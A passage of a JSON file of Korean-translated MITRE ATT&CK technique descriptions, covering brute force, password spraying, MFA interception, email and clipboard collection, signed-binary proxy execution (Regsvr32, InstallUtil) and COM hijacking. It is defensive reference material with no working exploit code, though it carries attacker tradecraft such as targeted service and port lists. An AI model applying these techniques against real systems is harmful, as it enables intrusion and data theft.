      "description": "일부 적대자는 컴퓨터 부품을 손상시키고 운영 체제 및 주요 시스템 펌웨어 또는 BIOS 외부에서 적대자 코드를 실행할 악성 펌웨어를 설치하기 위해 정교한 수단을 사용할 수 있습니다. 이 기술은 [시스템 펌웨어](https://attack.mitre.org/techniques/T1019)와 유사할 수 있지만 동일한 능력이나 무결성 검사 수준을 가지지 않는 다른 시스템 구성 요소에 대해 수행됩니다. 악성 장치 펌웨어는 일반적인 액세스 유지 실패나 하드 디스크 재설치에도 불구하고 시스템에 대한 지속적인 액세스 수준을 제공할 수 있으며, 호스트 소프트웨어 기반 방어 및 무결성 검사를 피할 수 있는 방법이 될 수 있습니다.",
      "external_id": "T1109",
      "modified": "2020-10-23T15:04:14.614Z",
      "title": "Component Firmware",
      "translated": true
    },
    {
      "description": "적대자는 비밀번호가 알려져 있지 않거나 비밀번호 해시가 획득되었을 때 계정에 접근하기 위해 무차별 대입 공격(brute force techniques)을 사용할 수 있습니다. (인용: TrendMicro Pawn Storm 2020년 12월) 계정 또는 계정 집합의 비밀번호에 대한 정보가 없는 경우, 적대자는 반복적이거나 반복적인 메커니즘을 사용하여 비밀번호를 체계적으로 추측할 수 있습니다. (인용: Dragos Crashoverride 2018년) 비밀번호에 대한 무차별 대입 공격은 자격 증명의 유효성을 검사할 수 있는 서비스와 상호작용하거나, 이전에 획득한 자격 증명 데이터(예: 비밀번호 해시)를 기반으로 오프라인에서 이루어질 수 있습니다.\n\n자격 증명에 대한 무차별 대입 공격은 침해 발생 중 여러 지점에서 수행될 수 있습니다. 예를 들어, 적대자는 [유효한 계정](https://attack.mitre.org/techniques/T1078)에 대한 접근을 무차별 대입 공격을 통해 시도할 수 있으며, 이는 [운영 체제 자격 증명 덤프](https://attack.mitre.org/techniques/T1003), [계정 탐색](https://attack.mitre.org/techniques/T1087), 또는 [비밀번호 정책 탐색](https://attack.mitre.org/techniques/T1201)과 같은 다른 사후 침해 행동에서 수집한 정보에 기반하여 수행될 수 있습니다. 적대자는 또한 초기 접근(Initial Access)의 일환으로 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)와 같은 행동과 무차별 대입 공격 활동을 결합할 수 있습니다.",
      "external_id": "T1110",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Brute Force",
      "translated": true
    },
    {
      "description": "시스템이나 환경 내에서 합법적인 자격 증명에 대한 사전 지식이 없는 공격자는 계정에 접근하기 위해 비밀번호를 추측할 수 있습니다. 공격자는 계정의 비밀번호를 알지 못할 경우 반복적이거나 반복적인 메커니즘을 사용하여 체계적으로 비밀번호를 추측할 수 있습니다. 공격자는 일반적인 비밀번호 목록을 사용하여 시스템이나 환경의 비밀번호에 대한 사전 지식 없이 로그인 자격 증명을 추측할 수 있습니다. 비밀번호 추측은 실패한 시도가 일정 수를 초과하면 계정을 잠글 수 있는 대상의 정책을 고려할 수 있습니다.\n\n비밀번호를 추측하는 것은 위험한 선택일 수 있습니다. 이는 조직의 로그인 실패 정책에 따라 수많은 인증 실패 및 계정 잠금을 초래할 수 있기 때문입니다. (출처: Cylance Cleaver)\n\n일반적으로 비밀번호를 추측할 때는 자주 사용되는 포트에 대한 관리 서비스가 사용됩니다. 일반적으로 목표로 삼는 서비스는 다음과 같습니다:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 터미널 서비스 (3389/TCP)\n* HTTP/HTTP 관리 서비스 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP 및 162/TCP/UDP)\n\n관리 서비스 외에도 공격자는 \"연합 인증 프로토콜을 사용하는 단일 로그인(SSO) 및 클라우드 기반 애플리케이션\"을 타겟으로 할 수 있으며, Office 365와 같은 외부-facing 이메일 애플리케이션도 포함됩니다. (출처: US-CERT TA18-068A 2018) 또한 공격자는 네트워크 장치 인터페이스(예: `wlanAPI`)를 악용하여 무선 인증 프로토콜을 통해 접근 가능한 Wi-Fi 라우터를 무차별 대입할 수 있습니다. (출처: Trend Micro Emotet 2020)\n\n기본 환경에서는 LDAP 및 Kerberos 연결 시도가 SMB에서 \"로그온 실패\" 이벤트 ID 4625를 생성할 가능성이 적습니다.",
      "external_id": "T1110.001",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Password Guessing",
      "translated": true
    },
    {
      "description": "적대자는 자격 증명 자료인 비밀번호 해시(password hash)가 확보되었을 때, 유용한 자격 증명(예: 평문 비밀번호)을 복구하기 위해 비밀번호 크래킹(password cracking)을 사용할 수 있습니다. [운영 체제 자격 증명 덤프(OS Credential Dumping](https://attack.mitre.org/techniques/T1003)은 비밀번호 해시를 얻는 데 사용될 수 있으며, [해시 전달(Pass the Hash)](https://attack.mitre.org/techniques/T1550/002)가 불가능할 경우 적대자가 이에 대해 제한된 성과만을 얻을 수 있습니다. 또한, 적대자는 [구성 저장소의 데이터(Data from Configuration Repository)](https://attack.mitre.org/techniques/T1602)를 활용하여 네트워크 장치에 대한 해시 자격 증명을 확보할 수 있습니다.(Citation: US-CERT-TA18-106A)\n\n해시를 계산하는 데 사용된 비밀번호를 체계적으로 추측하는 기술이 있으며, 적대자는 미리 계산된 레인보우 테이블(rainbow table)을 사용하여 해시를 크래킹할 수도 있습니다. 해시 크래킹은 일반적으로 목표 네트워크 외부의 적대자가 제어하는 시스템에서 수행됩니다. (Citation: Wikipedia Password cracking) 성공적으로 크랙된 해시에서 얻어진 평문 비밀번호는 계정이 접근할 수 있는 시스템, 리소스 및 서비스에 로그인하는 데 사용될 수 있습니다.",
      "external_id": "T1110.002",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Password Cracking",
      "translated": true
    },
    {
      "description": "적대 세력은 여러 다른 계정에 대해 일반적으로 사용되는 비밀번호 목록을 사용하여 유효한 계정 자격 증명을 획득하려고 시도할 수 있습니다. 비밀번호 스프레이는 단일 비밀번호(예: 'Password01') 또는 일반적으로 사용되는 비밀번호 목록을 사용하여 도메인의 복잡성 정책과 일치할 수 있습니다. 이 비밀번호로 네트워크의 여러 계정에 대해 로그인을 시도하여, 많은 비밀번호로 단일 계정을 무차별 대입할 때 발생하는 계정 잠금 현상을 피합니다. (출처: BlackHillsInfosec Password Spraying)\n\n일반적으로 비밀번호 스프레이를 수행할 때는 일반적으로 사용되는 포트에서 관리 서비스가 사용됩니다. 흔히 표적이 되는 서비스는 다음과 같습니다:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 터미널 서비스 (3389/TCP)\n* HTTP/HTTP 관리 서비스 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\n관리 서비스 외에도 적대 세력은 \"단일 로그온(SSO) 및 연합 인증 프로토콜을 사용하는 클라우드 기반 애플리케이션을 표적화할 수 있으며,\" 외부에서 접근 가능한 이메일 애플리케이션(예: Office 365)도 포함됩니다. (출처: US-CERT TA18-068A 2018)\n\n기본 환경에서는 LDAP 및 Kerberos 연결 시도는 SMB에서 이벤트를 발생시킬 가능성이 낮아, Windows \"로그온 실패\" 이벤트 ID 4625를 생성합니다.",
      "external_id": "T1110.003",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Password Spraying",
      "translated": true
    },
    {
      "description": "공격자는 무관한 계정의 유출된 데이터에서 얻은 자격 증명을 통해 자격 증명이 겹치는 대상 계정에 접근할 수 있습니다. 때때로, 웹사이트나 서비스가 침해되었을 때 대량의 사용자 이름과 비밀번호 쌍이 온라인에 유출되며, 사용자 계정 자격 증명이 액세스됩니다. 이 정보는 사용자들이 개인 및 비즈니스 계정에서 동일한 비밀번호를 사용하는 경향을 이용하여 계정을 손상시키려는 적에게 유용할 수 있습니다.\n\n자격 증명 공격(Credential stuffing)은 위험한 옵션입니다. 이는 조직의 로그인 실패 정책에 따라 다수의 인증 실패 및 계정 잠금을 초래할 수 있기 때문입니다.\n\n일반적으로 자격 증명을 입력할 때 사용되는 관리 서비스는 일반적으로 사용되는 포트를 통해 이루어집니다. 일반적으로 공격의 주요 대상이 되는 서비스는 다음과 같습니다:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / 터미널 서비스 (3389/TCP)\n* HTTP/HTTP 관리 서비스 (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\n관리 서비스 외에도 공격자는 \"단일 사인온(SSO) 및 연합 인증 프로토콜을 사용하는 클라우드 기반 애플리케이션\"을 목표로 하며, Office 365와 같은 외부 이메일 애플리케이션을 타겟팅할 수 있습니다. (인용: US-CERT TA18-068A 2018)",
      "external_id": "T1110.004",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Credential Stuffing",
      "translated": true
    },
    {
      "description": "적대적 공격자는 다중 요소 인증(MFA) 메커니즘(예: 스마트 카드, 토큰 생성기 등)을 목표로 하여 시스템, 서비스 및 네트워크 리소스에 접근하는 데 사용할 수 있는 자격 증명을 획득할 수 있습니다. MFA 사용은 권장되며 사용자 이름 및 비밀번호만 사용하는 것보다 높은 수준의 보안을 제공하지만, 조직은 이러한 보안 메커니즘을 가로채거나 우회할 수 있는 기술에 대해 인식해야 합니다.\n\n스마트 카드가 다중 요소 인증에 사용되는 경우, 일반적인 사용 중에 스마트 카드와 관련된 비밀번호를 얻기 위해 키로깅 장치를 사용해야 합니다. 카드가 삽입되어 있고 스마트 카드 비밀번호에 접근할 수 있는 경우, 공격자는 감염된 시스템을 사용하여 삽입된 하드웨어 토큰을 통해 인증을 프록시하여 네트워크 리소스에 연결할 수 있습니다. (출처: Mandiant M Trends 2011)\n\n적대적 공격자는 유사한 방식으로 RSA SecurID와 같은 다른 하드웨어 토큰을 목표로 하기 위해 키로깅 장치를 사용할 수 있습니다. 토큰 입력(사용자의 개인 식별 코드 포함)을 캡처하는 것은 일시적인 접근을 제공할 수 있으며(예: 다음 값 롤오버까지 일회용 비밀번호 재생) 공격자가 미래의 인증 값을 예측할 수 있게 할 수도 있습니다(알고리즘과 임시 코드를 생성하는 데 사용된 시드 값에 접근할 경우). (출처: GCN RSA June 2011)\n\nMFA의 다른 방법도 공격자가 인증하는 데 가로채고 사용할 수 있습니다. 일회용 코드는 일반적으로 대체 통신(이메일, SMS)을 통해 전송되는 것이 일반적입니다. 장치 및/또는 서비스가 보호되지 않으면 가로채기에 취약할 수 있습니다. 서비스 제공자도 공격의 대상이 될 수 있습니다. 예를 들어, 공격자는 SMS 메시징 서비스를 타겟화하여 사용자 전화기로 전송되는 MFA 코드를 훔칠 수 있습니다. (출처: Okta Scatter Swine 2022)",
      "external_id": "T1111",
      "modified": "2024-10-15T16:37:20.612Z",
      "title": "Multi-Factor Authentication Interception",
      "translated": true
    },
    {
      "description": "위협 행위자들은 Windows 레지스트리와 상호작용하여 레지스트리 키 내에 구성 정보를 숨기거나, 정리의 일환으로 정보를 제거하거나, 지속성과 실행을 지원하기 위한 다른 기술의 일환으로 사용합니다.\n\n레지스트리의 특정 영역에 대한 접근은 계정 권한에 따라 달라지며, 일부는 관리자 수준의 접근을 요구합니다. 로컬 또는 원격 레지스트리를 수정하기 위해 내장된 Windows 명령줄 유틸리티인 [Reg](https://attack.mitre.org/software/S0075)를 사용할 수 있습니다. (인용: Microsoft Reg) 또한 원격 접근 도구와 같은 다른 도구들이 사용될 수 있으며, 이 도구는 Windows API를 통해 레지스트리와 상호작용하는 기능을 포함할 수 있습니다.\n\n레지스트리 수정에는 키를 숨기는 동작도 포함될 수 있으며, 예를 들어 키 이름 앞에 널 문자를 추가하면 [Reg](https://attack.mitre.org/software/S0075) 또는 Win32 API를 사용하는 다른 유틸리티로 읽을 때 오류가 발생하거나 무시됩니다. (인용: Microsoft Reghide NOV 2006) 위협 행위자들은 이러한 가상 숨김 키를 악용하여 지속성을 유지하는 데 사용되는 페이로드나 명령을 숨길 수 있습니다. (인용: TrendMicro POWELIKS AUG 2014) (인용: SpectorOps Hiding Reg Jul 2017)\n\n원격 시스템의 레지스트리를 수정하여 파일 실행을 지원하는데 사용되며, 이는 타겟 시스템에서 원격 레지스트리 서비스가 실행 중이어야 합니다. (인용: Microsoft Remote) 일반적으로 [유효한 계정](https://attack.mitre.org/techniques/T1078)이 필요하며, 원격 시스템의 [SMB/Windows 관리 공유](https://attack.mitre.org/techniques/T1021/002)에 접근하여 RPC 통신을 수행해야 합니다.",
      "external_id": "T1112",
      "modified": "2023-08-14T19:19:54.148Z",
      "title": "Modify Registry",
      "translated": true
    },
    {
      "description": "공격자는 작전 진행 중 정보를 수집하기 위해 데스크탑의 화면을 캡처하려고 할 수 있습니다. 화면 캡처 기능은 보안 침해 이후의 작업에 사용되는 원격 액세스 도구의 기능으로 포함될 수 있습니다. 스크린샷을 찍는 것은 일반적으로 네이티브 유틸리티나 API 호출을 통해서도 가능합니다. 예를 들어, <code>CopyFromScreen</code>, <code>xwd</code>, 또는 <code>screencapture</code>와 같은 방법이 있습니다. (출처: CopyFromScreen .NET)(출처: 구식 Mac 맬웨어)",
      "external_id": "T1113",
      "modified": "2023-03-30T21:01:39.967Z",
      "title": "Screen Capture",
      "translated": true
    },
    {
      "description": "적대세력은 민감한 정보를 수집하기 위해 사용자 이메일을 타겟으로 할 수 있습니다. 이메일에는 무역 비밀이나 개인 정보 등과 같은 민감한 데이터가 포함될 수 있으며, 이는 적대세력에게 가치가 있을 수 있습니다. 또한 이메일에는 진행 중인 사고 대응 작업에 대한 세부 정보가 포함될 수 있어, 이는 적대세력이 기법을 조정하여 지속성을 유지하거나 방어를 회피할 수 있도록 할 수 있습니다. (출처: TrustedSec OOB Communications) (출처: CISA AA20-352A 2021) 적대세력은 메일 서버나 클라이언트에서 이메일을 수집하거나 전달할 수 있습니다.",
      "external_id": "T1114",
      "modified": "2024-10-15T12:24:27.627Z",
      "title": "Email Collection",
      "translated": true
    },
    {
      "description": "공격자는 민감한 정보를 수집하기 위해 로컬 시스템의 사용자 이메일을 타겟으로 할 수 있습니다. 이메일 데이터가 포함된 파일은 사용자의 로컬 시스템에서 획득할 수 있으며, 예를 들어 Outlook 저장소나 캐시 파일이 있습니다.\n\nOutlook은 오프라인 데이터 파일에 데이터를 로컬로 저장하며, 이 파일의 확장자는 .ost입니다. Outlook 2010 및 이후 버전은 최대 50GB의 .ost 파일 크기를 지원하며, 이전 버전의 Outlook은 최대 20GB를 지원합니다. (출처: Outlook 파일 크기) Outlook 2013(이전 버전 포함)의 IMAP 계정과 POP 계정은 .ost 대신 Outlook 데이터 파일(.pst)을 사용하며, Outlook 2016 및 이후 버전의 IMAP 계정은 .ost 파일을 사용합니다. 두 종류의 Outlook 데이터 파일은 일반적으로 `C:\\Users\\<username>\\Documents\\Outlook Files` 또는 `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`에 저장됩니다. (출처: Microsoft Outlook 파일)",
      "external_id": "T1114.001",
      "modified": "2020-03-24T17:59:20.983Z",
      "title": "Local Email Collection",
      "translated": true
    },
    {
      "description": "적대 세력은 민감한 정보를 수집하기 위해 Exchange 서버, Office 365 또는 Google Workspace를 목표로 할 수 있습니다. 적대 세력은 사용자의 자격 증명을 활용하여 Exchange 서버와 직접 상호작용하여 네트워크 내의 정보를 획득할 수 있습니다. 또한 외부에 노출된 Exchange 서비스, Office 365 또는 Google Workspace에 접근하여 자격 증명이나 접근 토큰을 사용해 이메일에 접근할 수 있습니다. 특정 키워드 검색을 자동화하기 위해 [MailSniper](https://attack.mitre.org/software/S0413)와 같은 도구를 사용할 수 있습니다.",
      "external_id": "T1114.002",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Remote Email Collection",
      "translated": true
    },
    {
      "description": "공격자는 민감한 정보를 수집하기 위해 이메일 전달 규칙을 설정할 수 있습니다. 공격자는 이 이메일 전달 규칙을 악용하여 피해자의 활동을 모니터링하고, 정보를 탈취하며, 피해자 또는 피해자의 조직에 대한 추가 정보를 수집하여 향후 공격이나 작전의 일환으로 사용할 수 있습니다.(인용: US-CERT TA18-068A 2018) 또한, 이메일 전달 규칙은 공격자가 관리자가 손상된 자격 증명을 재설정한 이후에도 피해자의 이메일에 지속적으로 접근할 수 있도록 허용할 수 있습니다.(인용: Pfammatter - Hidden Inbox Rules) 대부분의 이메일 클라이언트는 사용자가 다양한 이메일 기능을 위한 인박스 규칙을 생성할 수 있게 하며, 여기에는 다른 수신자에게 전달하는 것도 포함됩니다. 이러한 규칙은 로컬 이메일 애플리케이션, 웹 인터페이스 또는 명령줄 인터페이스를 통해 생성될 수 있습니다. 메시지는 내부 또는 외부 수신자에게 전달될 수 있으며, 이 규칙의 범위에 제한이 없습니다. 관리자는 또한 사용자 계정에 대한 전달 규칙을 생성할 수 있으며, 이 경우에도 동일한 고려사항과 결과가 있습니다.(인용: Microsoft Tim McMichael Exchange Mail Forwarding 2)(인용: Mac Forwarding Rules)\n\n조직 내의 사용자나 관리자는 (또는 유효한 자격 증명을 가진 공격자는) 수신된 모든 메시지를 자동으로 다른 수신자에게 전달하거나 발신자에 따라 이메일을 다른 위치로 전달하는 규칙을 생성할 수 있습니다. 공격자는 또한 Microsoft 메시징 API(MAPI)를 사용하여 규칙 속성을 수정함으로써 해당 규칙을 숨길 수 있으며, 이에 따라 Outlook, OWA 또는 대부분의 Exchange 관리 도구에서 보이지 않도록 만들 수 있습니다.(인용: Pfammatter - Hidden Inbox Rules)\n\n일부 환경에서는 관리자가 개별 인박스가 아닌 조직 전체에서 운영되는 이메일 전달 규칙을 활성화할 수 있습니다. 예를 들어, Microsoft Exchange는 조직이 수신하는 모든 이메일을 사용자 지정 조건에 대해 평가하고, 이러한 조건을 충족하는 메일에 대해 사용자 지정 작업을 수행하는 전송 규칙을 지원합니다.(인용: Microsoft Mail Flow Rules 2023) 이러한 기능을 악용하는 공격자는 조직이 수신하는 모든 메일 또는 특정 메일에 대한 전달을 활성화할 수 있습니다.",
      "external_id": "T1114.003",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Email Forwarding Rule",
      "translated": true
    },
    {
      "description": "공격자는 사용자가 애플리케이션 내 또는 애플리케이션 간에 정보를 복사할 때 클립보드에 저장된 데이터를 수집할 수 있습니다.\n\n예를 들어, Windows에서는 공격자가 <code>clip.exe</code> 또는 <code>Get-Clipboard</code>를 사용하여 클립보드 데이터를 접근할 수 있습니다.(인용: MSDN 클립보드)(인용: 클립_win_server)(인용: CISA_AA21_200B) 또한, 공격자는 사용자의 클립보드를 모니터링한 후 자신의 데이터로 교체할 수 있습니다(예: [전송 데이터 조작](https://attack.mitre.org/techniques/T1565/002)).(인용: mining_ruby_reversinglabs)\n\nmacOS 및 Linux에서도 <code>pbpaste</code>와 같은 명령어를 사용하여 클립보드 내용을 가져올 수 있습니다.(인용: EmPyre를 사용하여 작업하기)",
      "external_id": "T1115",
      "modified": "2023-04-14T21:51:47.277Z",
      "title": "Clipboard Data",
      "translated": true
    },
    {
      "description": "코드 서명은 개발자로부터 이진 파일의 신뢰성을 제공하고 이진 파일이 변조되지 않았음을 보장합니다. (출처: Wikipedia 코드 서명) 그러나 공격자는 악성 코드와 도구를 합법적인 이진 파일로 위장하기 위해 코드 서명 인증서를 사용하는 것으로 알려져 있습니다. (출처: Janicab) 운영 중에 사용되는 인증서는 공격자에 의해 생성되거나 위조되거나 도난당할 수 있습니다. (출처: Securelist 디지털 인증서) (출처: Symantec 디지털 인증서)\n\n소프트웨어의 첫 실행 시 코드 서명을 통해 검증하는 것은 최신 Windows 및 macOS/OS X 시스템에서 사용될 수 있습니다. 그러나 Linux는 플랫폼의 분산된 특성으로 인해 사용되지 않습니다. (출처: Wikipedia 코드 서명)\n\n코드 서명 인증서는 시스템에서 실행하기 위해 서명된 코드가 필요한 보안 정책을 우회하는 데 사용될 수 있습니다.",
      "external_id": "T1116",
      "modified": "2020-02-05T18:59:28.671Z",
      "title": "Code Signing",
      "translated": true
    },
    {
      "description": "Regsvr32.exe는 Windows 시스템에서 객체 링크 및 임베딩 제어체, 즉 동적 링크 라이브러리(DLL)를 등록 및 등록 해제하는 데 사용되는 명령줄 프로그램입니다. Regsvr32.exe는 임의의 바이너리를 실행하는 데 사용할 수 있습니다. (출처: Microsoft Regsvr32)\n\n적대 세력은 이 기능을 이용하여 코드 실행을 프록시하여 보안 도구가 regsvr32.exe 프로세스에서의 실행 및 모듈 로드를 감시하지 않도록 회피할 수 있습니다. 이는 화이트리스트 또는 Windows에서 정상 운영을 위해 regsvr32.exe 사용 시 발생할 수 있는 오탐지 때문입니다. Regsvr32.exe는 또한 Microsoft 서명 바이너리입니다.\n\nRegsvr32.exe는 특정 계정을 통해 DLL을 실행하기 위해 COM 스크립틀렛을 로드하는 기능을 사용하여 프로세스 화이트리스트를 우회하는 데 사용할 수 있습니다. Regsvr32.exe는 네트워크 및 프록시 인식이 가능하므로, 실행 중 인수로 외부 웹 서버의 파일에 대한 통합 리소스 로케이터(URL)를 전달하여 스크립트를 로드할 수 있습니다. 이 방법은 COM 개체가 실제로 등록되지 않고 단지 실행되기 때문에 레지스트리에 아무런 변화를 주지 않습니다. (출처: LOLBAS Regsvr32) 이 기술의 변형은 종종 \"Squiblydoo\" 공격이라고 불리며 정부를 대상으로 한 캠페인에서 사용되었습니다. (출처: Carbon Black Squiblydoo Apr 2016) (출처: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe는 지속성을 구축하기 위해 COM 객체를 등록하기 위해 [구성 요소 객체 모델 하이재킹](https://attack.mitre.org/techniques/T1122)을 통해 활용될 수 있습니다. (출처: Carbon Black Squiblydoo Apr 2016)",
      "external_id": "T1117",
      "modified": "2020-01-31T19:00:56.475Z",
      "title": "Regsvr32",
      "translated": true
    },
    {
      "description": "InstallUtil은 .NET 바이너리에 지정된 특정 설치 구성 요소를 실행하여 자원 설치 및 제거를 가능하게 하는 명령줄 유틸리티입니다. (출처: MSDN InstallUtil) InstallUtil은 Windows 시스템의 .NET 디렉토리 내에 위치해 있습니다: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> 및 <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>. InstallUtil.exe는 Microsoft에 의해 디지털 서명되어 있습니다.\n\n공격자는 InstallUtil을 사용하여 신뢰받는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. 또한 InstallUtil은 <code>[System.ComponentModel.RunInstaller(true)]</code> 속성으로 장식된 클래스를 실행하기 위한 바이너리 내 속성을 사용하여 프로세스 화이트리스트를 우회하는 데 사용될 수 있습니다. (출처: LOLBAS Installutil)",
      "external_id": "T1118",
      "modified": "2020-01-31T18:59:38.256Z",
      "title": "InstallUtil",
      "translated": true
    },
    {
      "description": "시스템 또는 네트워크에 침투한 후, 공격자는 내부 데이터를 수집하기 위해 자동화된 기법을 사용할 수 있습니다. 이 기법을 수행하는 방법에는 특정 시간 간격에 따라 파일 유형, 위치 또는 이름과 같은 설정된 기준에 부합하는 정보를 검색하고 복사하기 위한 [명령 및 스크립트 해석기](https://attack.mitre.org/techniques/T1059)의 사용이 포함될 수 있습니다.\n\n클라우드 기반 환경에서 공격자는 클라우드 API, 데이터 파이프라인, 명령 줄 인터페이스 또는 추출, 변환 및 적재(ETL) 서비스를 사용하여 데이터를 자동으로 수집할 수 있습니다. (인용: Mandiant UNC3944 SMS 피싱 2023)\n\n이 기능은 원격 액세스 도구에도 내장될 수 있습니다.\n\n이 기법은 [파일 및 디렉터리 검색](https://attack.mitre.org/techniques/T1083) 및 [측면 도구 전송](https://attack.mitre.org/techniques/T1570)와 같은 다른 기법을 통합하여 파일을 식별하고 이동하는 것과, [클라우드 서비스 대시보드](https://attack.mitre.org/techniques/T1538) 및 [클라우드 스토리지 객체 검색](https://attack.mitre.org/techniques/T1619) 기법을 사용하여 클라우드 환경의 자원을 식별할 수 있습니다.",
      "external_id": "T1119",
      "modified": "2024-09-25T20:40:07.791Z",
      "title": "Automated Collection",
      "translated": true
    },
    {
      "description": "위협 행위자는 컴퓨터 시스템에 연결된 주변 장치 및 구성 요소에 대한 정보를 수집하려고 할 수 있습니다.(출처: Peripheral Discovery Linux)(출처: Peripheral Discovery macOS) 주변 장치에는 다양한 기능을 지원하는 보조 자원이 포함될 수 있으며, 예를 들어 키보드, 프린터, 카메라, 스마트 카드 리더기 또는 이동식 저장 장치 등이 있습니다. 이 정보는 시스템 및 네트워크 환경에 대한 인식을 높이는 데 사용되거나 추가 작업을 위한 용도로 사용될 수 있습니다.",
      "external_id": "T1120",
      "modified": "2023-03-30T21:01:41.575Z",
      "title": "Peripheral Device Discovery",
      "translated": true
    },
    {
      "description": "Regsvcs와 Regasm은 .NET 컴포넌트 오브젝트 모델(COA) 어셈블리를 등록하는 데 사용되는 Windows 명령줄 유틸리티입니다. 두 프로그램 모두 Microsoft에 의해 디지털 서명되어 있습니다. (출처: MSDN Regsvcs) (출처: MSDN Regasm)\n\n공격자는 Regsvcs와 Regasm을 사용하여 신뢰할 수 있는 Windows 유틸리티를 통해 코드 실행을 프록시할 수 있습니다. 두 유틸리티는 등록 또는 등록 해제 전에 실행되어야 하는 코드를 지정하기 위해 이진 파일의 특성을 사용하여 프로세스 화이트리스트를 우회하는 데 사용될 수 있습니다: <code>[ComRegisterFunction]</code> 또는 <code>[ComUnregisterFunction]</code>입니다. 등록 및 등록 해제 속성을 가진 코드는 프로세스가 충분한 권한으로 실행되지 않거나 실행에 실패하더라도 실행됩니다. (출처: LOLBAS Regsvcs)(출처: LOLBAS Regasm)",
      "external_id": "T1121",
      "modified": "2020-01-31T19:00:30.734Z",
      "title": "Regsvcs/Regasm",
      "translated": true
    },
    {
      "description": "구성 요소 객체 모델(Component Object Model, COM)은 Windows 내에서 소프트웨어 구성 요소 간의 상호 작용을 운영 체제를 통해 가능하게 하는 시스템입니다. (출처: Microsoft Component Object Model) 공격자는 이 시스템을 활용하여 COM 참조 및 관계를 탈취함으로써 합법적인 소프트웨어 대신 실행될 수 있는 악성 코드를 삽입할 수 있습니다. COM 객체를 탈취하려면 Windows 레지스트리에서 변경을 수행하여 합법적인 시스템 구성 요소에 대한 참조를 대체해야 하며, 이로 인해 해당 구성 요소가 실행될 때 제대로 작동하지 않을 수 있습니다. 일반적인 시스템 작동을 통해 해당 시스템 구성 요소가 실행될 때 공격자의 코드가 대신 실행됩니다. (출처: GDATA COM Hijacking) 공격자는 시스템 내에서 눈에 띄는 기능 중단을 피하면서 지속 가능성을 유지하기 위해 충분히 자주 사용되는 객체를 탈취할 가능성이 높으며, 이는 시스템 불안정성을 초래하여 탐지가 이루어질 수 있는 상황을 피하기 위함입니다.",
      "external_id": "T1122",
      "modified": "2020-11-10T18:19:44.725Z",
      "title": "Component Object Model Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 컴퓨터의 주변 장치(예: 마이크 및 웹캠)나 애플리케이션(예: 음성 및 화상 통화 서비스)을 활용하여 오디오 녹음을 캡처하고 민감한 대화를 엿들어 정보를 수집할 수 있습니다. (출처: ESET Attor 2019년 10월)\n\n악성 소프트웨어나 스크립트는 운영 체제나 애플리케이션에서 제공하는 사용 가능한 API를 통해 장치와 상호 작용하여 오디오를 캡처할 수 있습니다. 오디오 파일은 디스크에 저장된 후 나중에 유출될 수 있습니다.",
      "external_id": "T1123",
      "modified": "2024-10-15T13:39:22.774Z",
      "title": "Audio Capture",
      "translated": true
    },
    {
      "description": "적대자는 로컬 또는 원격 시스템에서 시스템 시간 및/또는 시간대 설정을 수집할 수 있습니다. 시스템 시간은 Windows의 Windows Time Service와 macOS의 <code>systemsetup</code>와 같은 서비스에 의해 설정되고 저장됩니다.(인용: MSDN 시스템 시간)(인용: Technet Windows 시간 서비스)(인용: systemsetup mac 시간) 이러한 시간 설정은 일반적으로 도메인 내의 네트워크 시간 서버를 통해 기업 네트워크의 시스템 및 서비스 간에 동기화될 수 있습니다.(인용: Mac 시간 동기화)(인용: 리눅스 시스템 시간)\n\n시스템 시간 정보는 여러 가지 방법으로 수집될 수 있으며, 예를 들어 Windows에서 [Net](https://attack.mitre.org/software/S0039)을 사용하여 <code>net time \\\\hostname</code> 명령어를 실행함으로써 원격 시스템의 시스템 시간을 가져올 수 있습니다. 희생자의 시간대는 현재 시스템 시간을 통해 추론되거나 <code>w32tm /tz</code>를 사용하여 수집될 수 있습니다.(인용: Technet Windows 시간 서비스) 또한, 적대자는 <code>GetTickCount()</code>와 같은 함수를 통해 장치의 가동 시간을 발견할 수 있으며, 이를 통해 시스템이 부팅된 이후 얼마나 시간이 경과했는지를 판단할 수 있습니다.(인용: 가상화/샌드박스 회피)\n\n네트워크 장치에서는 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) 명령어인 `show clock detail`를 사용하여 현재 시간 구성을 확인할 수 있습니다.(인용: show_clock_detail_cisco_cmd)\n\n또한, 시스템 호출인 <code>time()</code>는 리눅스 장치에서 현재 시간을 수집하는 데 사용되고 있습니다.(인용: MAGNET GOBLIN) macOS 시스템에서는 적대자가 <code>systemsetup -gettimezone</code> 또는 <code>timeIntervalSinceNow</code>와 같은 명령어를 사용하여 현재 시간대 정보나 현재 날짜 및 시간을 수집할 수 있습니다.(인용: 시스템 정보 발견 